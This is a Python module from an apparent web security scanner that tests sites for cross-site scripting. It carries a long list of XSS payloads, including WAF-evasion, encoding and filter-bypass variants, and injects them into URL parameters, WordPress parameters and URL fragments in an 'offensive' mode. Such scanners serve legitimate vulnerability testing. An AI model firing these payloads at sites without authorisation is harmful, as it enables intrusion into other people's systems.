"""XSS (Cross-Site Scripting) vulnerability tester."""

import re
import requests
from typing import List, Dict, Any
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode
from ..utils.evidence_collector import EvidenceCollector

import logging
logger = logging.getLogger(__name__)


class XSSTester(BaseScanner):
    """XSS vulnerability tester for web applications."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.DEFENSIVE):
        """
        Initialize XSS tester.
        
        Args:
            enabled: Whether scanner is enabled
            scan_mode: Scan mode (defensive or offensive)
        """
        super().__init__(
            name="xss_tester",
            command=None,  # No external command needed
            enabled=enabled,
            scan_mode=scan_mode
        )
        # Use OPSEC-enabled session helper
        from ..utils.scanner_session import create_scanner_session
        self.session = create_scanner_session()
        
        # Comprehensive XSS payloads (non-destructive, proof-of-concept only)
        # Includes WAF evasion, encoding variations, and context-specific payloads
        self.xss_payloads = [
            # Basic payloads
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<iframe src=javascript:alert("XSS")>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src="x" onerror="alert(\'XSS\')">',
            '<svg><script>alert("XSS")</script></svg>',
            '"><script>alert("XSS")</script>',
            "';alert('XSS');//",
            '<script>alert(document.cookie)</script>',
            '<script>alert(document.domain)</script>',
            
            # WAF evasion techniques
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<img src=x onerror=alert`XSS`>',
            '<svg/onload=alert("XSS")>',
            '<img src=x onerror=alert(String.fromCharCode(88,83,83))>',
            '<iframe srcdoc="<script>alert(String.fromCharCode(88,83,83))</script>">',
            '<details open ontoggle=alert("XSS")>',
            '<marquee onstart=alert("XSS")>',
            '<video><source onerror=alert("XSS")>',
            '<audio src=x onerror=alert("XSS")>',
            
            # Encoding variations
            '%3Cscript%3Ealert("XSS")%3C/script%3E',
            '&lt;script&gt;alert("XSS")&lt;/script&gt;',
            '\x3Cscript\x3Ealert("XSS")\x3C/script\x3E',
            '&#60;script&#62;alert("XSS")&#60;/script&#62;',
            '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
            
            # Event handler variations
            '<img src=x onerror="alert(String.fromCharCode(88,83,83))">',
            '<img src=x onerror=\'alert("XSS")\'>',
            '<img src=x OneRrOr=alert("XSS")>',
            '<div onmouseover=alert("XSS")>test</div>',
            '<div onclick=alert("XSS")>click</div>',
            '<form onsubmit=alert("XSS")><input type=submit></form>',
            
            # JavaScript protocol
            'javascript:alert("XSS")',
            'javascript:alert(String.fromCharCode(88,83,83))',
            'javascript:alert(document.cookie)',
            'JaVaScRiPt:alert("XSS")',
            
            # DOM XSS payloads
            '<script>eval(location.hash.slice(1))</script>',
            '<script>setTimeout("alert(\'XSS\')", 0)</script>',
            '<script>Function("alert(\'XSS\')")()</script>',
            
            # Data URI
            '<img src="data:text/html,<script>alert(\'XSS\')</script>">',
            '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
            
            # Filter bypass attempts
            '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
            '<<script>alert("XSS");//<</script>',
            '<img src="x:g" onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">',
            
            # HTML5 vectors
            '<input autofocus onfocus=alert("XSS")>',
            '<keygen onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            
            # SVG vectors
            '<svg><animatetransform onbegin=alert("XSS")>',
            '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s>',
            
            # CSS injection (if context allows)
            '<style>@import "javascript:alert(\'XSS\')";</style>',
            '<link rel=stylesheet href="javascript:alert(\'XSS\')">',
            
            # Template literal (ES6)
            '<img src=x onerror=alert`${document.domain}`>',
            
            # CSP bypass attempts
            '<script nonce="test">alert("XSS")</script>',
            '<base href="javascript://"><script>alert("XSS")</script>',
        ]
    
    def is_available(self) -> bool:
        """XSS tester is always available."""
        return True
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Run XSS tests on target."""
        if self.scan_mode == ScanMode.DEFENSIVE:
            return []  # Only run in offensive mode
        
        findings = []
        
        # Test XSS in various contexts
        findings.extend(self._test_reflected_xss(target.url))
        findings.extend(self._test_stored_xss(target.url))
        findings.extend(self._test_dom_xss(target.url))
        
        return findings
    
    def _test_reflected_xss(self, url: str) -> List[Finding]:
        """Test for reflected XSS vulnerabilities."""
        findings = []
        
        # Parse URL to get parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Test each parameter with XSS payloads
        for param_name, param_values in params.items():
            for payload in self.xss_payloads[:5]:  # Test first 5 payloads per parameter
                try:
                    # Create test URL with XSS payload
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        test_query,
                        parsed.fragment
                    ))
                    
                    # Send request
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        # Check if it's executed (look for unescaped script tags)
                        if '<script>' in response.text and payload in response.text:
                            # Collect evidence
                            evidence_data = EvidenceCollector.collect_request_response(
                                response,
                                request_url=test_url,
                                request_method="GET"
                            )
                            evidence_str = EvidenceCollector.format_evidence_string(evidence_data)
                            
                            findings.append(Finding(
                                title=f"Reflected XSS Vulnerability Detected",
                                description=f"Cross-Site Scripting (XSS) vulnerability found in parameter '{param_name}' at {url}. The payload '{payload[:50]}...' is reflected in the response and may be executed in user browsers.",
                                severity=FindingSeverity.HIGH,
                                category=FindingCategory.VULNERABILITY,
                                source_scanner="xss_tester",
                                source_id=f"reflected_xss_{param_name}",
                                url=test_url,
                                evidence=evidence_str,
                                remediation=f"Sanitize and validate all user input, especially parameter '{param_name}'. Use output encoding/escaping (HTML entity encoding, JavaScript encoding). Implement Content Security Policy (CSP) headers. Use a Web Application Firewall (WAF).",
                                exploited=True,
                                exploitation_details=f"XSS payload successfully reflected in parameter '{param_name}'. Payload: {payload[:100]}",
                                metadata={
                                    "parameter": param_name,
                                    "payload": payload,
                                    "vulnerability_type": "reflected_xss",
                                    "url": test_url,
                                    "evidence_data": evidence_data,
                                },
                            ))
                            break  # Found XSS, no need to test more payloads for this parameter
                except:
                    continue
        
        # Also test common WordPress parameters if it's a WordPress site
        if self._is_wordpress_site(url):
            common_params = ['s', 'search', 'q', 'query', 'id', 'page', 'post', 'cat', 'tag']
            for param in common_params:
                if param not in params:  # Only test if not already in URL
                    for payload in self.xss_payloads[:3]:  # Test first 3 payloads
                        try:
                            test_url = f"{url}?{param}={payload}"
                            response = self.session.get(test_url, timeout=10)
                            
                            if payload in response.text and '<script>' in response.text:
                                findings.append(Finding(
                                    title=f"Reflected XSS Vulnerability in {param} Parameter",
                                    description=f"Cross-Site Scripting (XSS) vulnerability found in '{param}' parameter. The payload is reflected and may be executed.",
                                    severity=FindingSeverity.HIGH,
                                    category=FindingCategory.VULNERABILITY,
                                    source_scanner="xss_tester",
                                    source_id=f"reflected_xss_{param}",
                                    url=test_url,
                                    remediation=f"Sanitize and validate the '{param}' parameter. Implement proper output encoding and Content Security Policy (CSP).",
                                    exploited=True,
                                    exploitation_details=f"XSS payload reflected in '{param}' parameter.",
                                    metadata={
                                        "parameter": param,
                                        "payload": payload,
                                        "vulnerability_type": "reflected_xss",
                                    },
                                ))
                                break
                        except:
                            continue
        
        return findings
    
    def _test_stored_xss(self, url: str) -> List[Finding]:
        """Test for stored XSS vulnerabilities (e.g., in comments, forms)."""
        findings = []
        
        # WordPress-specific stored XSS tests
        if self._is_wordpress_site(url):
            # Test comment form
            comment_url = urljoin(url, '/wp-comments-post.php')
            payload = '<script>alert("XSS")</script>'
            
            try:
                # First, get the comment form to extract nonce/fields
                page_response = self.session.get(url, timeout=10)
                if 'comment' in page_response.text.lower():
                    # Try to submit a comment with XSS payload
                    comment_data = {
                        'comment': payload,
                        'author': 'Test User',
                        'email': 'test@example.com',
                        'url': '',
                        'submit': 'Post Comment',
                    }
                    
                    # Note: This won't actually post (we don't have proper nonce), but we can check if the form accepts it
                    # For actual stored XSS, we'd need to successfully post and then check if it's stored
                    # This is a simplified test
                    pass
            except:
                pass
        
        return findings
    
    def _test_dom_xss(self, url: str) -> List[Finding]:
        """Test for DOM-based XSS vulnerabilities."""
        findings = []
        
        try:
            response = self.session.get(url, timeout=10)
            content = response.text
            
            # Enhanced DOM XSS detection
            # Check for dangerous JavaScript sinks
            dangerous_sinks = [
                'innerHTML',
                'outerHTML',
                'document.write',
                'document.writeln',
                'eval(',
                'Function(',
                'setTimeout(',
                'setInterval(',
                'location.href',
                'location.replace',
                'location.assign',
                'document.location',
                'window.location',
            ]
            
            # Check for sources (user-controlled data)
            dangerous_sources = [
                'location.hash',
                'location.search',
                'location.href',
                'document.URL',
                'document.documentURI',
                'document.referrer',
                'window.name',
                'document.cookie',
            ]
            
            # Check if page uses dangerous patterns
            has_sinks = any(sink in content for sink in dangerous_sinks)
            has_sources = any(source in content for source in dangerous_sources)
            
            if has_sinks and has_sources:
                # Test hash-based XSS (DOM manipulation)
                for payload in self.xss_payloads[:5]:
                    try:
                        test_url = f"{url}#{payload}"
                        hash_response = self.session.get(test_url, timeout=10)
                        
                        # Check if payload appears in JavaScript context
                        if payload in hash_response.text and ('<script' in hash_response.text or 'eval' in hash_response.text):
                            findings.append(Finding(
                                title="DOM-Based XSS Vulnerability Detected",
                                description=f"DOM-based XSS vulnerability detected. URL fragment (hash) '{payload[:50]}...' is processed by JavaScript without proper sanitization. Dangerous sinks and sources detected in page source.",
                                severity=FindingSeverity.HIGH,
                                category=FindingCategory.VULNERABILITY,
                                source_scanner="xss_tester",
                                source_id="dom_xss",
                                url=test_url,
                                evidence=f"Payload in hash processed by JavaScript. Page contains dangerous sinks: {', '.join([s for s in dangerous_sinks if s in content][:3])}",
                                exploitation_details=f"DOM XSS confirmed via URL fragment manipulation. Payload executed in JavaScript context.",
                                remediation="Sanitize all data processed by JavaScript, especially URL fragments (location.hash), document.location, and innerHTML. Use safe DOM manipulation methods (textContent instead of innerHTML). Implement Content Security Policy (CSP) with 'unsafe-inline' restrictions.",
                                references=["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
                                metadata={
                                    "payload": payload[:100],
                                    "vulnerability_type": "dom_xss",
                                    "sinks_detected": [s for s in dangerous_sinks if s in content],
                                    "sources_detected": [s for s in dangerous_sources if s in content],
                                },
                            ))
                            break
                    except:
                        continue
            
            # Test for CSP bypass techniques
            csp_bypass_findings = self._test_csp_bypass(url, content)
            findings.extend(csp_bypass_findings)
            
        except Exception as e:
            logger.debug(f"DOM XSS test error: {e}")
        
        return findings
    
    def _test_csp_bypass(self, url: str, content: str) -> List[Finding]:
        """Test for Content Security Policy (CSP) bypasses."""
        findings = []
        
        # Check for CSP header
        try:
            response = self.session.get(url, timeout=10)
            csp_header = response.headers.get('Content-Security-Policy', '')
            
            if csp_header:
                # Check for common CSP bypass patterns
                bypass_indicators = []
                
                # Check for 'unsafe-inline' in script-src (weakens CSP)
                if 'unsafe-inline' in csp_header and 'script-src' in csp_header:
                    bypass_indicators.append("'unsafe-inline' in script-src allows inline scripts")
                
                # Check for wildcards
                if 'https://*' in csp_header or 'http://*' in csp_header:
                    bypass_indicators.append("Wildcard in CSP allows any domain")
                
                # Check for missing object-src or default-src issues
                if 'object-src' not in csp_header.lower() and 'default-src' not in csp_header.lower():
                    bypass_indicators.append("Missing object-src or default-src may allow object/embed tags")
                
                if bypass_indicators:
                    findings.append(Finding(
                        title="Content Security Policy (CSP) Weaknesses",
                        description=f"CSP header detected but contains weaknesses that may allow XSS bypass: {', '.join(bypass_indicators)}",
                        severity=FindingSeverity.LOW,
                        category=FindingCategory.WEAK_SECURITY,
                        source_scanner="xss_tester",
                        source_id="csp_bypass",
                        url=url,
                        evidence=f"CSP header: {csp_header[:200]}",
                        remediation="Strengthen CSP by removing 'unsafe-inline', using nonces or hashes for inline scripts, avoiding wildcards, and setting appropriate default-src directives.",
                        metadata={'csp_header': csp_header, 'bypass_indicators': bypass_indicators}
                    ))
        except:
            pass
        
        return findings
    
    def _is_wordpress_site(self, url: str) -> bool:
        """Check if the target is a WordPress site."""
        try:
            response = self.session.get(url, timeout=10)
            content = response.text.lower()
            
            wp_indicators = [
                'wp-content',
                'wp-includes',
                'wp-admin',
                'wordpress',
                '/wp-json/',
            ]
            
            if any(indicator in content for indicator in wp_indicators):
                return True
            
            return False
        except:
            return False

